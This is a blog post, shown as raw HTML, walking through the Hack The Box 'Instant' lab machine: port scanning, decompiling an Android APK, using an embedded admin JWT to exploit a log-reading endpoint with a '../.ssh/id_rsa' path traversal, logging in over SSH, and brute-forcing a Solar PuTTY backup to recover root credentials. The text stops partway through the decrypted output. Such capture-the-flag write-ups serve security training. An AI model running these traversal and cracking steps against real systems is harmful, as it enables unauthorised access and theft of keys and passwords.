<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Instant - Machine Walkthrough | pshegger&#39;s blog</title>
<meta name="keywords" content="hack the box, HTB, penetration testing, walkthrough, reverse engineering">
<meta name="description" content="Walkthrough for the Instant machine on HackTheBox">
<meta name="author" content="pshegger">
<link rel="canonical" href="https://pshegger.github.io/posts/htb-instant/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://pshegger.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pshegger.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pshegger.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://pshegger.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://pshegger.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://pshegger.github.io/posts/htb-instant/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-NKBPT9CS94"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-NKBPT9CS94');
        }
      </script><meta property="og:url" content="https://pshegger.github.io/posts/htb-instant/">
  <meta property="og:site_name" content="pshegger&#39;s blog">
  <meta property="og:title" content="Instant - Machine Walkthrough">
  <meta property="og:description" content="Walkthrough for the Instant machine on HackTheBox">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-05-06T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-05-06T00:00:00+00:00">
    <meta property="article:tag" content="Hack the Box">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="Walkthrough">
    <meta property="article:tag" content="Reverse Engineering">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Instant - Machine Walkthrough">
<meta name="twitter:description" content="Walkthrough for the Instant machine on HackTheBox">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://pshegger.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Instant - Machine Walkthrough",
      "item": "https://pshegger.github.io/posts/htb-instant/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Instant - Machine Walkthrough",
  "name": "Instant - Machine Walkthrough",
  "description": "Walkthrough for the Instant machine on HackTheBox",
  "keywords": [
    "hack the box", "HTB", "penetration testing", "walkthrough", "reverse engineering"
  ],
  "articleBody": "Introduction Instant is a medium difficulty Linux machine on HackTheBox.\nTo compromise the machine, we need to decompile an Android application, find credentials for a Swagger page, and discover an endpoint with a Local File Inclusion vulnerability. We can use this vulnerability to get the SSH private key for a user on the machine. Once we’re on the machine, we can discover a backup file for Solar PuTTY, which we can crack to recover the root password.\nInitial Scan Now that we’re finished with the quick summary, let’s start the detailed walkthrough by scanning the target. We can run an nmap scan for the top 1000 ports and run the default scripts to get some information about the target.\n┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ nmap -sC -sV -A instant.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-13 15:08 CEST Nmap scan report for instant.htb (10.10.11.37) Host is up (0.055s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA) |_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519) 80/tcp open http Apache httpd 2.4.58 |_http-server-header: Apache/2.4.58 (Ubuntu) |_http-title: Instant Wallet # ...SNIP... Nmap done: 1 IP address (1 host up) scanned in 22.38 seconds Looking at the scan results, we can see that there are two open ports, TCP/22 (SSH) and TCP/80 (HTTP). We also learn that the target is running an (Ubuntu) Linux operating system.\nAndroid APK We can continue our enumeration by visiting the webpage in our browser, and will quickly find an Android APK file that we should download to continue our investigation.\nDecompiling APK files are similar to JAR files in the sense that both of them are simple ZIP files containing compiled JVM code and resources. We can unzip the file and see the content, but we will not find anything useful this way. To recover the content in a useful way, we need to use a few tools.\nThe first one is Apktool which extracts the application resources into a human-readable form. It also extracts the sources into smali files, but we can do better than that using different tools.\n┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ apktool d instant.apk Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true I: Using Apktool 2.7.0-dirty on instant.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: /home/pshegger/.local/share/apktool/framework/1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... I: Copying META-INF/services directory Decompiling the source code takes more steps. First, we need to extract the .apk file. Then, we can use dex2jar to convert the extracted classes.dex file(s), into a standard .jar file. Once we have that, we can use any Java decompiler (e.g.: jd-gui) to see the source code.\n┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ unzip instant.apk -d instant_apk # ...SNIP... ┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ cd instant_apk ┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ d2j-dex2jar.sh classes.dex # ...SNIP... Finding Swagger Once we have both the resources and the decompiled source code, we can move on with our enumeration. Let’s start by going through the resources. Most of them are not important to us, but we can find an interesting one called network_security_config.xml. This file is usually used for configuring various security settings, like certificate pinning and enabling clear text traffic (see the documentation for more info).\n┌──(pshegger㉿suki)-[~/Documents/htb/instant] └─$ cat instant/res/xml/network_security_config.xml \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e ",
  "wordCount" : "1074",
  "inLanguage": "en",
  "datePublished": "2025-05-06T00:00:00Z",
  "dateModified": "2025-05-06T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "pshegger"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pshegger.github.io/posts/htb-instant/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "pshegger's blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pshegger.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pshegger.github.io/" accesskey="h" title="pshegger&#39;s blog (Alt + H)">pshegger&#39;s blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pshegger.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://pshegger.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Instant - Machine Walkthrough
    </h1>
    <div class="post-description">
      Walkthrough for the Instant machine on HackTheBox
    </div>
    <div class="post-meta"><span title='2025-05-06 00:00:00 +0000 UTC'>May 6, 2025</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;pshegger

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
                <li>
                    <a href="#initial-scan" aria-label="Initial Scan">Initial Scan</a></li>
                <li>
                    <a href="#android-apk" aria-label="Android APK">Android APK</a><ul>
                        
                <li>
                    <a href="#decompiling" aria-label="Decompiling">Decompiling</a></li>
                <li>
                    <a href="#finding-swagger" aria-label="Finding Swagger">Finding Swagger</a></li>
                <li>
                    <a href="#admin-jwt" aria-label="Admin JWT">Admin JWT</a></li></ul>
                </li>
                <li>
                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li>
                <li>
                    <a href="#solar-putty" aria-label="Solar PuTTY">Solar PuTTY</a></li>
                <li>
                    <a href="#root-flag" aria-label="Root Flag">Root Flag</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
<p><a href="https://app.hackthebox.com/machines/Instant">Instant</a> is a medium difficulty Linux machine on <a href="https://app.hackthebox.com/">HackTheBox</a>.</p>
<p>To compromise the machine, we need to decompile an Android application, find credentials for a Swagger page, and discover an endpoint with a <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">Local File Inclusion</a> vulnerability. We can use this vulnerability to get the SSH private key for a user on the machine. Once we&rsquo;re on the machine, we can discover a backup file for <a href="https://www.solarwinds.com/free-tools/solar-putty">Solar PuTTY</a>, which we can crack to recover the <code>root</code> password.</p>
<h1 id="initial-scan">Initial Scan<a hidden class="anchor" aria-hidden="true" href="#initial-scan">#</a></h1>
<p>Now that we&rsquo;re finished with the quick summary, let&rsquo;s start the detailed walkthrough by scanning the target. We can run an <code>nmap</code> scan for the top 1000 ports and run the default scripts to get some information about the target.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nmap -sC -sV -A instant.htb
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-13 15:08 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> instant.htb <span style="color:#f92672">(</span>10.10.11.37<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.58
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.58 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Instant Wallet
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 22.38 seconds
</span></span></code></pre></div><p>Looking at the scan results, we can see that there are two open ports, <code>TCP/22</code> (<code>SSH</code>) and <code>TCP/80</code> (<code>HTTP</code>). We also learn that the target is running an (Ubuntu) Linux operating system.</p>
<h1 id="android-apk">Android APK<a hidden class="anchor" aria-hidden="true" href="#android-apk">#</a></h1>
<p>We can continue our enumeration by visiting the webpage in our browser, and will quickly find an Android <a href="https://en.wikipedia.org/wiki/Apk_(file_format)">APK</a> file that we should download to continue our investigation.</p>
<h2 id="decompiling">Decompiling<a hidden class="anchor" aria-hidden="true" href="#decompiling">#</a></h2>
<p><code>APK</code> files are similar to <code>JAR</code> files in the sense that both of them are simple <code>ZIP</code> files containing compiled <code>JVM</code> code and resources. We can unzip the file and see the content, but we will not find anything useful this way. To recover the content in a useful way, we need to use a few tools.</p>
<p>The first one is <a href="https://apktool.org/">Apktool</a> which extracts the application resources into a human-readable form. It also extracts the sources into <a href="https://mobsecguys.medium.com/smali-assembler-for-dalvik-e37c8eed22f9">smali</a> files, but we can do better than that using different tools.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ apktool d instant.apk
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
</span></span><span style="display:flex;"><span>I: Using Apktool 2.7.0-dirty on instant.apk
</span></span><span style="display:flex;"><span>I: Loading resource table...
</span></span><span style="display:flex;"><span>I: Decoding AndroidManifest.xml with resources...
</span></span><span style="display:flex;"><span>I: Loading resource table from file: /home/pshegger/.local/share/apktool/framework/1.apk
</span></span><span style="display:flex;"><span>I: Regular manifest package...
</span></span><span style="display:flex;"><span>I: Decoding file-resources...
</span></span><span style="display:flex;"><span>I: Decoding values */* XMLs...
</span></span><span style="display:flex;"><span>I: Baksmaling classes.dex...
</span></span><span style="display:flex;"><span>I: Copying assets and libs...
</span></span><span style="display:flex;"><span>I: Copying unknown files...
</span></span><span style="display:flex;"><span>I: Copying original files...
</span></span><span style="display:flex;"><span>I: Copying META-INF/services directory
</span></span></code></pre></div><p>Decompiling the source code takes more steps. First, we need to extract the <code>.apk</code> file. Then, we can use <a href="https://github.com/pxb1988/dex2jar">dex2jar</a> to convert the extracted <code>classes.dex</code> file(s), into a standard <code>.jar</code> file. Once we have that, we can use any Java decompiler (e.g.: <a href="https://github.com/java-decompiler/jd-gui">jd-gui</a>) to see the source code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ unzip instant.apk -d instant_apk
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cd instant_apk
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ d2j-dex2jar.sh classes.dex
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...SNIP...</span>
</span></span></code></pre></div><h2 id="finding-swagger">Finding Swagger<a hidden class="anchor" aria-hidden="true" href="#finding-swagger">#</a></h2>
<p>Once we have both the resources and the decompiled source code, we can move on with our enumeration. Let&rsquo;s start by going through the resources. Most of them are not important to us, but we can find an interesting one called <code>network_security_config.xml</code>. This file is usually used for configuring various security settings, like certificate pinning and enabling clear text traffic (see the <a href="https://developer.android.com/privacy-and-security/security-config">documentation</a> for more info).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat instant/res/xml/network_security_config.xml
</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>?&gt;
</span></span><span style="display:flex;"><span>&lt;network-security-config&gt;
</span></span><span style="display:flex;"><span>    &lt;domain-config cleartextTrafficPermitted<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;domain includeSubdomains<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;mywalletv1.instant.htb&lt;/domain&gt;
</span></span><span style="display:flex;"><span>        &lt;domain includeSubdomains<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;true&#34;</span>&gt;swagger-ui.instant.htb&lt;/domain&gt;
</span></span><span style="display:flex;"><span>    &lt;/domain-config&gt;
</span></span><span style="display:flex;"><span>&lt;/network-security-config&gt;
</span></span></code></pre></div><h2 id="admin-jwt">Admin JWT<a hidden class="anchor" aria-hidden="true" href="#admin-jwt">#</a></h2>
<p>If we visit the Swagger page now, we will find a few endpoints, including <code>/api/v1/admin/read/log</code>. The documentation states that it can be used to read log files by specifying a file name and if it&rsquo;s not properly implemented, we might be able to use it for <code>LFI</code>. Unfortunately, if we try to call it, we will not be able to, since the endpoint needs authorization.</p>
<p>At this point, we need to go back to our decompiled application and look for something that&rsquo;ll grant us the required authorization. After some searching, we can find a class called <code>AdminActivities</code>, that has a method named <code>TestAdminAuthorization</code>. This method simply makes an HTTP call to a different admin endpoint, but more importantly for us, it contains a <code>JWT</code>. With the token in hand, we can try the above-mentioned endpoint to see if it&rsquo;s vulnerable to <code>LFI</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ curl -H <span style="color:#e6db74">&#34;Authorization:eyJhbG&lt;SNIP&gt;WZ6rYA&#34;</span> <span style="color:#e6db74">&#39;http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa&#39;</span> | jq .
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;/home/shirohige/logs/../.ssh/id_rsa&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;-----BEGIN RSA PRIVATE KEY-----\n&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;MIIEogIBAAKCAQEAsMV1q8D3iRAYlNsYfcukAuGCL/ix/3BDbnSmk/IXaPCQYiRM\n&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;jlMjppbHYuLUHAjkucXrWrZyUCKHApwr3/VnZDFvWQx+5qd685E=\n&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;-----END RSA PRIVATE KEY-----\n&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;Status&#34;</span>: <span style="color:#ae81ff">201</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h1 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h1>
<p>Once we have the SSH key, we can simply log in to the target and read the flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ chmod <span style="color:#ae81ff">600</span> shirohige_id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ssh shirohige@instant.htb -i shirohige_id_rsa
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Sun Oct <span style="color:#ae81ff">13</span> 18:24:24 <span style="color:#ae81ff">2024</span> from 10.10.14.130
</span></span><span style="display:flex;"><span>shirohige@instant:~$ cat user.txt
</span></span><span style="display:flex;"><span>&lt;REDACTED&gt;
</span></span></code></pre></div><h1 id="solar-putty">Solar PuTTY<a hidden class="anchor" aria-hidden="true" href="#solar-putty">#</a></h1>
<p>Once we are on the machine, we can start looking for possible ways of privilege escalation.</p>
<p>Looking around the filesystem is a good starting point, and if we&rsquo;re observant enough, we can find a file called <code>sessions-backup.dat</code> in the folder <code>/opt/backups/Solar-PuTTY</code>.</p>
<p>If we&rsquo;re not familiar with Solar PuTTY, we can look into it with a simple Google search, and learn that it&rsquo;s an SSH client for Windows, and we can also find that it supports saving credentials. We can assume that the previously mentioned backup file will have something useful for us.</p>
<p>We can start looking for ways of extracting the backed-up data from the file, and we will soon come across <a href="https://voidsec.com/solarputtydecrypt/">this post</a> by <a href="https://x.com/Void_Sec">VoidSec</a>. The post has some insight into how the file is encrypted, and it also contains a tool that can decrypt it if we know the password. Since we don&rsquo;t know the encryption password, we can try brute-forcing it, but that needs a separate tool (or modifications to this one). Luckily, someone already implemented this as a Python script, which you can find <a href="https://github.com/ItsWatchMakerr/SolarPuttyCracker/blob/main/SolarPuttyCracker.py">here</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant/SolarPuttyCracker<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python SolarPuttyCracker.py -w /usr/share/wordlists/rockyou.txt ../sessions-backup.dat -v
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>Testing password <span style="color:#e6db74">&#39;princesa&#39;</span>: Incorrect
</span></span><span style="display:flex;"><span>Testing password <span style="color:#e6db74">&#39;alexandra&#39;</span>: Incorrect
</span></span><span style="display:flex;"><span>Testing password <span style="color:#e6db74">&#39;alexis&#39;</span>: Incorrect
</span></span><span style="display:flex;"><span>Testing password <span style="color:#e6db74">&#39;jesus&#39;</span>: Incorrect
</span></span><span style="display:flex;"><span>Decryption successful using password: estrella
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/htb/instant/SolarPuttyCracker<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat SolarPutty_sessions_decrypted.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Sessions&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ...SNIP...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Credentials&#34;</span>: <span style="color:#f92672">[</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Id&#34;</span>: <span style="color:#e6db74">&#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;CredentialsName&#34;</span>: <span style="color:#e6db74">&#34;instant-root&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Username&#34;</span>: <span style="color:#e6db74">&#34;root&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Password&#34;</span>: <span style="color:#e6db74">&#34;12&lt;REDACTED&gt;12&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;PrivateKeyPath&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Passphrase&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;PrivateKeyContent&#34;</span>: null
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;AuthScript&#34;</span>: <span style="color:#f92672">[]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Groups&#34;</span>: <span style="color:#f92672">[]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Tunnels&#34;</span>: <span style="color:#f92672">[]</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;LogsFolderDestination&#34;</span>: <span style="color:#e6db74">&#34;C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs&#34;</span>
